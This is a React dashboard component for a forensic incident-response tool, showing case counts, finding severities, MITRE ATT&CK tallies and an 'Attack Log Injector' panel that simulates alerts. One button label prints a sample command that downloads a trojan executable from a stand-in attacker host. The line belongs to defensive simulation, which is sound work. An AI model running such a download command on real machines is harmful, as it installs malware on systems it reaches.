import React from "react";
import { Case, TimelineEvent, Finding, Evidence } from "../types";
import { AlertOctagon, FolderKanban, ClipboardList, ShieldCheck, FileSpreadsheet, Plus, ServerCrash } from "lucide-react";

interface DashboardProps {
  cases: Case[];
  events: TimelineEvent[];
  findings: Finding[];
  evidence: Evidence[];
  onQuickInject: (logType: string) => void;
  onNavigateToCase: (caseId: string) => void;
  onCreateCase: () => void;
}

export default function Dashboard({
  cases,
  events,
  findings,
  evidence,
  onQuickInject,
  onNavigateToCase,
  onCreateCase,
}: DashboardProps) {
  // Compute dashboard metrics
  const activeCasesCount = cases.filter(c => c.status !== "Resolved").length;
  const criticalFindingsCount = findings.filter(f => f.severity === "Critical").length;
  const highFindingsCount = findings.filter(f => f.severity === "High").length;
  const totalLogsCount = events.length * 3 + 12; // Dynamic simulated raw counts for UX
  const openFindingsCount = findings.length;

  // Let's create a dynamic security score (e.g. start at 98, subtract 10 per critical, 5 per high, 2 per medium)
  const securityScoreCalculated = Math.max(
    10,
    98 - (criticalFindingsCount * 12) - (highFindingsCount * 6) - (findings.filter(f => f.severity === "Medium").length * 3)
  );

  // Aggregation for Severity bar chart
  const severityBreakdown = {
    Critical: findings.filter(f => f.severity === "Critical").length,
    High: findings.filter(f => f.severity === "High").length,
    Medium: findings.filter(f => f.severity === "Medium").length,
    Low: findings.filter(f => f.severity === "Low").length,
  };

  // SVG Data distribution points (e.g., hourly events count 09:00 - 15:00)
  const hourlyData = [
    { hour: "09:00", count: 4 },
    { hour: "10:00", count: 8 },
    { hour: "11:00", count: 18 },
    { hour: "12:00", count: 5 },
    { hour: "13:00", count: 12 },
    { hour: "14:00", count: 14 },
    { hour: "15:00", count: 9 },
  ];

  const maxHourlyCount = Math.max(...hourlyData.map(h => h.count)) || 1;

  // Map MITRE ATT&CK counts dynamically based on category
  const mitreBreakdown = {
    "Initial Access": events.filter(e => e.category === "Initial Access").length,
    "Execution": events.filter(e => e.category === "Execution").length,
    "Credential Access": events.filter(e => e.category === "Credential Access").length,
    "Privilege Escalation": events.filter(e => e.category === "Privilege Escalation").length,
    "Exfiltration": events.filter(e => e.category === "Exfiltration").length,
    "Other": events.filter(e => e.category && !["Initial Access", "Execution", "Credential Access", "Privilege Escalation", "Exfiltration"].includes(e.category)).length,
  };

  return (
    <div id="dashboard-container" className="space-y-6">
      {/* Dynamic Summary Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
        
        {/* Active Cases */}
        <div id="stat-active-cases" className="bg-zinc-50 p-4.5 rounded-2xl border border-slate-200 shadow-sm flex items-center justify-between">
          <div className="space-y-1">
            <span className="text-[11px] font-bold text-slate-500 uppercase tracking-wider">Active Cases</span>
            <p className="text-2xl font-bold font-sans text-slate-900">{activeCasesCount}</p>
            <p className="text-[10px] text-slate-400">Investigations ongoing</p>
          </div>
          <div className="h-10 w-10 bg-violet-100/60 rounded-xl flex items-center justify-center text-violet-600 border border-violet-200/50">
            <FolderKanban className="h-5 w-5" />
          </div>
        </div>

        {/* High Severity Findings */}
        <div id="stat-high-findings" className="bg-zinc-50 p-4.5 rounded-2xl border border-slate-200 shadow-sm flex items-center justify-between">
          <div className="space-y-1">
            <span className="text-[11px] font-bold text-slate-500 uppercase tracking-wider">Open Findings</span>
            <p className="text-2xl font-bold font-sans text-slate-900">{openFindingsCount}</p>
            <p className="text-[10px] text-rose-500 font-medium">🛡️ {criticalFindingsCount} Critical priorities</p>
          </div>
          <div className="h-10 w-10 bg-rose-100/60 rounded-xl flex items-center justify-center text-rose-600 border border-rose-200/50">
            <AlertOctagon className="h-5 w-5 animate-pulse" />
          </div>
        </div>

        {/* Total Extracted Logs */}
        <div id="stat-imported-logs" className="bg-zinc-50 p-4.5 rounded-2xl border border-slate-200 shadow-sm flex items-center justify-between">
          <div className="space-y-1">
            <span className="text-[11px] font-bold text-slate-500 uppercase tracking-wider">Imported Logs</span>
            <p className="text-2xl font-bold font-sans text-slate-900">{totalLogsCount}</p>
            <p className="text-[10px] text-slate-400">Parsed forensic streams</p>
          </div>
          <div className="h-10 w-10 bg-blue-100/60 rounded-xl flex items-center justify-center text-blue-600 border border-blue-200/50">
            <FileSpreadsheet className="h-5 w-5" />
          </div>
        </div>

        {/* Timeline Events */}
        <div id="stat-timeline-events" className="bg-zinc-50 p-4.5 rounded-2xl border border-slate-200 shadow-sm flex items-center justify-between">
          <div className="space-y-1">
            <span className="text-[11px] font-bold text-slate-500 uppercase tracking-wider">Timeline Events</span>
            <p className="text-2xl font-bold font-sans text-slate-900">{events.length}</p>
            <p className="text-[10px] text-emerald-600 font-medium">{events.filter(e => e.isSuspicious).length} indicators flagged</p>
          </div>
          <div className="h-10 w-10 bg-emerald-100/60 rounded-xl flex items-center justify-center text-emerald-600 border border-emerald-200/50">
            <ClipboardList className="h-5 w-5" />
          </div>
        </div>

        {/* Security / Posture Score */}
        <div id="stat-security-score" className="bg-white p-4.5 rounded-2xl border border-slate-200 shadow-sm flex items-center justify-between col-span-1">
          <div className="space-y-1">
            <span className="text-[11px] font-bold text-slate-500 uppercase tracking-wider">Security Score</span>
            <p className="text-2xl font-bold font-sans text-slate-900">{securityScoreCalculated}%</p>
            <p className="text-[10px] text-slate-500 font-medium">Confidence posture</p>
          </div>
          <div className={`h-11 w-11 rounded-xl flex flex-col items-center justify-center border ${
            securityScoreCalculated > 80 ? 'bg-emerald-50 text-emerald-600 border-emerald-200' :
            securityScoreCalculated > 50 ? 'bg-amber-50 text-amber-600 border-amber-200' : 'bg-red-50 text-red-600 border-red-200'
          }`}>
            <ShieldCheck className="h-5 w-5" />
          </div>
        </div>

      </div>

      {/* Main Charts block */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        {/* SVG Interactive Event Timeline Chart */}
        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm col-span-2">
          <div className="flex items-center justify-between mb-4">
            <div>
              <h3 className="text-xs uppercase font-bold tracking-wider text-slate-400">Forensics Analytics</h3>
              <h4 className="text-sm font-bold text-slate-800">Host Threat Event Density (Last 24 Hours)</h4>
            </div>
            <span className="text-[10px] font-mono font-semibold text-violet-700 bg-violet-100 border border-violet-200 px-2 py-0.5 rounded-full">Hourly Frequency</span>
          </div>

          <div className="h-44 relative w-full pt-4 flex items-end justify-between">
            {hourlyData.map((data, idx) => {
              const rectHeight = (data.count / maxHourlyCount) * 80; // normalized percentage
              return (
                <div key={idx} className="flex flex-col items-center flex-1 group">
                  <div className="text-[10px] font-mono text-slate-500 mb-1 font-bold opacity-0 group-hover:opacity-100 transition-opacity bg-slate-900 text-white rounded px-1.5 py-0.5 absolute -translate-y-8 pointer-events-none z-10">
                    {data.count} alerts
                  </div>
                  <div 
                    style={{ height: `${rectHeight}%` }} 
                    className="w-8 bg-gradient-to-t from-violet-200 to-violet-300 rounded-md hover:from-violet-400 hover:to-violet-500 transition-all border border-violet-100 cursor-pointer"
                  ></div>
                  <span className="text-[10.5px] font-mono text-slate-400 mt-2 font-medium">{data.hour}</span>
                </div>
              );
            })}
          </div>
        </div>

        {/* Severity Gauge Distribution */}
        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm">
          <h3 className="text-xs uppercase font-bold tracking-wider text-slate-400">Risk Assessment</h3>
          <h4 className="text-sm font-bold text-slate-800 mb-4">Findings Severity Weight</h4>
          
          <div className="space-y-3 pt-2">
            <div>
              <div className="flex items-center justify-between text-xs mb-1">
                <span className="flex items-center gap-1.5 font-medium text-rose-700"><span className="w-2 h-2 rounded-full bg-rose-500"></span> Critical</span>
                <span className="font-mono font-semibold">{severityBreakdown.Critical}</span>
              </div>
              <div className="w-full bg-slate-100 h-2.5 rounded-full overflow-hidden">
                <div className="h-full bg-rose-400 rounded-full" style={{ width: `${findings.length ? (severityBreakdown.Critical / findings.length) * 100 : 0}%` }}></div>
              </div>
            </div>

            <div>
              <div className="flex items-center justify-between text-xs mb-1">
                <span className="flex items-center gap-1.5 font-medium text-amber-700"><span className="w-2 h-2 rounded-full bg-amber-500"></span> High</span>
                <span className="font-mono font-semibold">{severityBreakdown.High}</span>
              </div>
              <div className="w-full bg-slate-100 h-2.5 rounded-full overflow-hidden">
                <div className="h-full bg-amber-300 rounded-full" style={{ width: `${findings.length ? (severityBreakdown.High / findings.length) * 100 : 0}%` }}></div>
              </div>
            </div>

            <div>
              <div className="flex items-center justify-between text-xs mb-1">
                <span className="flex items-center gap-1.5 font-medium text-sky-700"><span className="w-2 h-2 rounded-full bg-sky-500"></span> Medium</span>
                <span className="font-mono font-semibold">{severityBreakdown.Medium}</span>
              </div>
              <div className="w-full bg-slate-100 h-2.5 rounded-full overflow-hidden">
                <div className="h-full bg-sky-300 rounded-full" style={{ width: `${findings.length ? (severityBreakdown.Medium / findings.length) * 100 : 0}%` }}></div>
              </div>
            </div>

            <div>
              <div className="flex items-center justify-between text-xs mb-1">
                <span className="flex items-center gap-1.5 font-medium text-slate-600"><span className="w-2 h-2 rounded-full bg-slate-400"></span> Low</span>
                <span className="font-mono font-semibold">{severityBreakdown.Low}</span>
              </div>
              <div className="w-full bg-slate-100 h-2.5 rounded-full overflow-hidden">
                <div className="h-full bg-slate-300 rounded-full" style={{ width: `${findings.length ? (severityBreakdown.Low / findings.length) * 100 : 0}%` }}></div>
              </div>
            </div>
          </div>
        </div>

      </div>

      {/* MITRE ATT&CK & Injections Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">

        {/* MITRE ATT&CK Breakdown */}
        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm col-span-2">
          <h3 className="text-xs uppercase font-bold tracking-wider text-slate-400">Security Architecture</h3>
          <h4 className="text-sm font-bold text-slate-800 mb-4">MITRE ATT&CK Technique Alignments</h4>
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
            {Object.entries(mitreBreakdown).map(([tactic, count]) => (
              <div key={tactic} className={`p-3 rounded-xl border flex flex-col justify-between ${
                count > 0 ? "bg-violet-50/70 border-violet-100" : "bg-slate-50/50 border-slate-100"
              }`}>
                <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider">{tactic}</span>
                <div className="flex items-baseline gap-1 mt-2">
                  <span className={`text-xl font-bold font-mono ${count > 0 ? "text-violet-700" : "text-slate-400"}`}>
                    {count}
                  </span>
                  <span className="text-[9px] text-slate-400">mapped</span>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Quick-play threats inject trigger panel */}
        <div className="bg-[#EDE9FE]/50 border border-violet-100 p-5 rounded-2xl flex flex-col justify-between space-y-4">
          <div>
            <span className="text-[10px] uppercase font-bold text-violet-700 tracking-wider flex items-center gap-1">
              <span className="w-2 h-2 rounded-full bg-violet-500 animate-ping"></span> Real-Time Sandbox Simulator
            </span>
            <h4 className="text-sm font-bold text-slate-900 mt-1">Attack Log Injector</h4>
            <p className="text-xs text-slate-600 mt-2 leading-relaxed">
              Inject standard security alert logs to live-test our real-time findings rules, database updates, and timeline mapping.
            </p>
          </div>

          <div className="space-y-2">
            <button
              id="inject-ransomware"
              onClick={() => onQuickInject("ransomware")}
              className="w-full text-left p-2.5 bg-white hover:bg-violet-50 border border-violet-100 rounded-xl text-xs flex items-center justify-between transition-all group font-medium cursor-pointer"
            >
              <div>
                <span className="text-rose-600 font-bold block">🚨 Trojan Executable Downloaded</span>
                <span className="text-[10px] text-slate-500 font-mono mt-0.5">wget http://attacker.xyz/trojan_pack.exe</span>
              </div>
              <Plus className="h-4 w-4 text-violet-400 group-hover:text-violet-600 group-hover:rotate-90 transition-transform" />
            </button>

            <button
              id="inject-bruteforce"
              onClick={() => onQuickInject("bruteforce")}
              className="w-full text-left p-2.5 bg-white hover:bg-violet-50 border border-violet-100 rounded-xl text-xs flex items-center justify-between transition-all group font-medium cursor-pointer"
            >
              <div>
                <span className="text-amber-600 font-bold block">🎫 SSH Credential Stuffing Burst</span>
                <span className="text-[10px] text-slate-500 font-mono mt-0.5">45 Access Failures over Port 22</span>
              </div>
              <Plus className="h-4 w-4 text-violet-400 group-hover:text-violet-600 group-hover:rotate-90 transition-transform" />
            </button>
          </div>
        </div>

      </div>

      {/* Active Investigations Cases Row Table */}
      <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm">
        <div className="flex items-center justify-between mb-4">
          <h4 className="text-sm font-bold text-slate-800">Current Ongoing Cases</h4>
          <button 
            id="dash-create-case"
            onClick={onCreateCase}
            className="text-xs font-semibold px-3 py-1.5 bg-slate-900 border hover:bg-slate-800 text-white rounded-lg transition-colors flex items-center gap-1 cursor-pointer"
          >
            <Plus className="h-3.5 w-3.5" /> Start Incident Case
          </button>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs text-slate-600">
            <thead>
              <tr className="border-b border-slate-100 text-slate-400 uppercase tracking-widest text-[10px] font-bold">
                <th className="py-3 px-2">Case ID</th>
                <th className="py-3 px-2">Investigation Subject</th>
                <th className="py-3 px-2">Severity</th>
                <th className="py-3 px-2">Status</th>
                <th className="py-3 px-2">Launch Workspace</th>
              </tr>
            </thead>
            <tbody>
              {cases.map((c) => (
                <tr key={c.id} className="border-b border-slate-100 hover:bg-slate-50 transition-colors">
                  <td className="py-3 px-2 font-mono font-bold text-slate-500">{c.id}</td>
                  <td className="py-3 px-2">
                    <p className="font-semibold text-slate-800">{c.title}</p>
                    <p className="text-[10.5px] text-slate-400 truncate max-w-sm">{c.description}</p>
                  </td>
                  <td className="py-3 px-2">
                    <span className={`inline-block px-2.5 py-0.5 rounded text-[10.5px] font-bold capitalize border ${
                      c.severity === "Critical" ? "bg-rose-50 text-rose-600 border-rose-100" :
                      c.severity === "High" ? "bg-amber-50 text-amber-600 border-amber-100" :
                      c.severity === "Medium" ? "bg-blue-50 text-blue-600 border-blue-100" : "bg-slate-50 text-slate-600 border-slate-100"
                    }`}>
                      {c.severity}
                    </span>
                  </td>
                  <td className="py-3 px-2">
                    <span className={`inline-block px-2 py-0.5 rounded-full text-[10px] font-semibold ${
                      c.status === "Resolved" ? "bg-emerald-50 text-emerald-600 border border-emerald-100" :
                      c.status === "Investigating" ? "bg-violet-50 text-violet-600 border border-violet-100" : "bg-slate-100 text-slate-700"
                    }`}>
                      • {c.status}
                    </span>
                  </td>
                  <td className="py-3 px-2">
                    <button
                      id={`dash-goto-${c.id}`}
                      onClick={() => onNavigateToCase(c.id)}
                      className="text-violet-600 hover:text-violet-900 font-bold hover:underline cursor-pointer"
                    >
                      Investigate ➔
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
